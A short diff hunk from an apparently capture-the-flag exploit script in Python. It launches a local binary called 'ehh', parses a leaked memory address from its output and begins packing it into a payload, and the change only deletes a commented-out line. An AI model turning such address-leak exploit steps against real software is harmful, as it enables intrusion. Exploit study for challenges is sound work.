@@ -434,7 +434,6 @@ proc = subprocess.Popen(['./ehh'], stdout = subprocess.PIPE, stdin = subprocess.
 leak = proc.stdout.readline() # >Input interesting text here< 0x565ba028
 leak = leak.split(' ')[4].strip() # 0x56615028
 leak = int(leak,16) # 1448632360
-#addr = int(leak[2:10],16)
 
 payload = ''
 payload += struct.pack("<L",leak)
